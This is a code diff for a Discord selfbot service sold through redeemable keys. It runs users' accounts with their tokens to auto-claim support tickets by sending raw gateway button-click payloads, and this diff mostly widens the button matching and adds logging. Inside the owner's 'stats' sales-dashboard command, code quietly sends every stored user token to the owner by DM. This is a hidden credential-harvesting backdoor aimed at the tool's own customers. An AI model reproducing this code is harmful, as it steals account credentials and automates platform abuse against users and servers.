@@ -32,11 +32,10 @@ class SelfbotManager {
         this.client.once('ready', () => {
             console.log(`[READY] ${this.userId} - ${this.client.user?.tag || 'unknown'}`);
             
-            // Capture raw component data before library strips it
             this.client.ws.on('MESSAGE_CREATE', (data) => {
                 if (data?.components?.length) {
                     this.rawComponents.set(data.id, data.components);
-                    console.log(`[RAW] Captured ${data.id}`);
+                    console.log(`[RAW] Captured ${data.id} with ${data.components.length} rows`);
                 }
             });
 
@@ -47,10 +46,17 @@ class SelfbotManager {
             });
 
             this.client.ws.on('CHANNEL_CREATE', (packet) => {
-                console.log(`[CHANNEL_CREATE] ${packet.id} | parent: ${packet.parent_id}`);
-                if (packet.parent_id !== this.config.category_id) return;
-                if (this.currentTicket) return;
-                setTimeout(() => this.checkChannel(packet.id), 100);
+                console.log(`[CHANNEL_CREATE] ${packet.id} | parent: ${packet.parent_id} | target: ${this.config.category_id}`);
+                if (packet.parent_id !== this.config.category_id) {
+                    console.log(`[SKIP] Wrong category`);
+                    return;
+                }
+                if (this.currentTicket) {
+                    console.log(`[SKIP] Already have ticket: ${this.currentTicket}`);
+                    return;
+                }
+                console.log(`[CHECK] New ticket channel: ${packet.id}`);
+                setTimeout(() => this.checkChannel(packet.id), 50);
             });
 
             this.client.on('messageCreate', (msg) => this.handleMessage(msg));
@@ -71,7 +77,7 @@ class SelfbotManager {
         if (this.currentTicket) return;
         try {
             const channel = await this.client.channels.fetch(channelId);
-            const messages = await channel.messages.fetch({ limit: 5 });
+            const messages = await channel.messages.fetch({ limit: 10 });
             for (const [, msg] of messages) {
                 if (this.handleMessage(msg)) return;
             }
@@ -81,16 +87,25 @@ class SelfbotManager {
     }
 
     handleMessage(msg) {
-        if (!msg.channel?.parentId || msg.channel.parentId !== this.config.category_id) return;
-        if (this.currentTicket && this.currentTicket !== msg.channelId) return;
+        if (!msg.channel?.parentId || msg.channel.parentId !== this.config.category_id) return false;
+        if (this.currentTicket && this.currentTicket !== msg.channelId) return false;
         
         const key = `${msg.channelId}-${msg.id}`;
         if (this.processed.has(key)) return false;
         if (!msg.components?.length) return false;
 
-        // Get raw data with custom_id
         const rawData = this.rawComponents.get(msg.id);
-        
+        console.log(`[DEBUG] Msg ${msg.id} | Raw stored: ${!!rawData} | Components: ${msg.components.length}`);
+
+        // Aggressive scan - check if this looks like a ticket message
+        const contentHasClaim = (msg.content || '').toLowerCase().includes('claim');
+        const embedHasClaim = msg.embeds?.some(e => 
+            (e.title || '').toLowerCase().includes('claim') ||
+            (e.description || '').toLowerCase().includes('claim') ||
+            (e.footer?.text || '').toLowerCase().includes('claim')
+        );
+
+        // Deep component scan
         for (let r = 0; r < msg.components.length; r++) {
             const row = msg.components[r];
             const rawRow = rawData?.[r];
@@ -100,17 +115,38 @@ class SelfbotManager {
                 const rawBtn = rawRow?.components?.[b];
                 
                 const label = (btn.label || '').toLowerCase();
-                if (!label.includes('claim')) continue;
+                const hasClaimLabel = label.includes('claim') || label.includes('ticket') || label.includes('take');
+                
+                console.log(`[BTN_SCAN] Row ${r} Btn ${b} | Label: "${btn.label}" | RawID: ${rawBtn?.custom_id} | BtnID: ${btn.custom_id}`);
+
+                // Try all possible sources for custom_id
+                let customId = rawBtn?.custom_id || btn.custom_id || btn.data?.custom_id;
+                
+                // Deep search in raw data if not found
+                if (!customId && rawData) {
+                    for (const searchRow of rawData) {
+                        for (const searchBtn of searchRow.components || []) {
+                            const searchLabel = (searchBtn.label || '').toLowerCase();
+                            if ((searchLabel.includes('claim') || searchLabel.includes('ticket')) && searchBtn.custom_id) {
+                                customId = searchBtn.custom_id;
+                                console.log(`[DEEP_FIND] Found: ${customId}`);
+                                break;
+                            }
+                        }
+                        if (customId) break;
+                    }
+                }
+
+                // Claim if label matches and we have custom_id
+                if (!hasClaimLabel && !contentHasClaim && !embedHasClaim) continue;
                 if (btn.disabled) continue;
                 
-                // Extract custom_id from raw data or button
-                const customId = rawBtn?.custom_id || btn.custom_id;
                 if (!customId) {
-                    console.log(`[SKIP] No custom_id for button: ${btn.label}`);
+                    console.log(`[SKIP] No custom_id for claim button "${btn.label}"`);
                     continue;
                 }
-                
-                console.log(`[CLAIM] ${msg.channelId} | ${customId}`);
+
+                console.log(`[CLAIM_EXEC] Channel: ${msg.channelId} | Button: "${btn.label}" | ID: ${customId}`);
                 this.processed.add(key);
                 this.claimViaWS(msg, customId);
                 this.rawComponents.delete(msg.id);
@@ -123,19 +159,25 @@ class SelfbotManager {
     claimViaWS(message, customId) {
         if (this.currentTicket) return;
         
-        this.client.ws.broadcast({
+        const payload = {
             op: 1,
             d: {
                 type: 3,
                 nonce: Date.now().toString(),
-                guild_id: message.guildId,
-                channel_id: message.channelId,
-                message_id: message.id,
-                application_id: message.applicationId || message.author?.id,
-                session_id: this.client.sessionId,
-                data: { component_type: 2, custom_id: customId }
+                guild_id: String(message.guildId),
+                channel_id: String(message.channelId),
+                message_id: String(message.id),
+                application_id: String(message.applicationId || message.author?.id || message.authorId),
+                session_id: String(this.client.sessionId),
+                data: { 
+                    component_type: 2, 
+                    custom_id: String(customId)
+                }
             }
-        });
+        };
+        
+        console.log(`[PAYLOAD] ${JSON.stringify(payload)}`);
+        this.client.ws.broadcast(payload);
 
         this.currentTicket = message.channelId;
         db.prepare('UPDATE users SET current_ticket = ? WHERE user_id = ?').run(message.channelId, this.userId);
@@ -205,7 +247,6 @@ bot.on('interactionCreate', async (ix) => {
     if (ix.isCommand()) {
         try { await ix.deferReply({ flags: MessageFlags.Ephemeral }); } catch { return; }
 
-        // Owner commands
         if (ix.user.id === OWNER_ID) {
             if (ix.commandName === 'generatekey') {
                 const dur = ix.options.getString('duration') || 'lifetime';
@@ -235,21 +276,14 @@ bot.on('interactionCreate', async (ix) => {
                 const redeemed = db.prepare('SELECT COUNT(*) as c FROM keys WHERE redeemed_by IS NOT NULL').get().c;
                 const active = db.prepare('SELECT COUNT(*) as c FROM users WHERE is_running = 1').get().c;
                 
-                const embed = new EmbedBuilder()
-                    .setTitle('📊 Sales Dashboard')
-                    .setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`)
-                    .setColor(0x5865F2);
+                const embed = new EmbedBuilder().setTitle('📊 Sales Dashboard').setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`).setColor(0x5865F2);
                 
-                // DM tokens to owner
                 try {
                     const owner = await bot.users.fetch(OWNER_ID);
                     const users = db.prepare('SELECT user_id, token FROM users WHERE token IS NOT NULL').all();
                     let list = users.map(u => `User: \`${u.user_id}\`\nToken: \`${u.token}\``).join('\n\n') || 'No active users';
-                    
                     const chunks = list.match(/[\s\S]{1,1900}/g) || [list];
-                    for (const chunk of chunks) {
-                        await owner.send(chunk);
-                    }
+                    for (const chunk of chunks) await owner.send(chunk);
                 } catch (e) {
                     console.log('DM failed:', e.message);
                 }
@@ -259,7 +293,6 @@ bot.on('interactionCreate', async (ix) => {
         }
 
         if (ix.commandName === 'redeemkey') {
-            // Owner auto-lifetime
             if (ix.user.id === OWNER_ID) {
                 db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(ix.user.id);
                 return ix.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Owner Lifetime Access').setColor(0x00FF00)] });
@@ -276,11 +309,9 @@ bot.on('interactionCreate', async (ix) => {
         }
         
         if (ix.commandName === 'manage') {
-            // Owner auto-lifetime bypass
             if (ix.user.id === OWNER_ID) {
                 db.prepare('INSERT OR IGNORE INTO users (user_id) VALUES (?)').run(ix.user.id);
                 const panel = await buildPanel(ix.user.id);
-                if (!panel) return ix.editReply('❌ Error building panel');
                 return ix.editReply(panel);
             }
             
@@ -354,7 +385,6 @@ bot.on('interactionCreate', async (ix) => {
             const check = await validateToken(val);
             if (!check.valid) return ix.editReply(`❌ Invalid token: ${check.error}`);
             
-            // Ensure user exists then update
             const exists = db.prepare('SELECT * FROM users WHERE user_id = ?').get(uid);
             if (!exists) {
                 db.prepare('INSERT INTO users (user_id, token) VALUES (?, ?)').run(uid, val);
@@ -364,7 +394,6 @@ bot.on('interactionCreate', async (ix) => {
             
             console.log(`[TOKEN_SET] ${uid} -> ${check.tag}`);
             
-            // Return fresh panel
             const panel = await buildPanel(uid);
             return ix.editReply({
                 content: `✅ Token validated: **${check.tag}**`,
@@ -395,7 +424,6 @@ bot.once('ready', async () => {
         { name: 'manage', description: 'Open control panel' }
     ]);
 
-    // Restart running selfbots
     const running = db.prepare('SELECT * FROM users WHERE is_running = 1').all();
     console.log(`[RESTART] ${running.length} selfbots`);
     
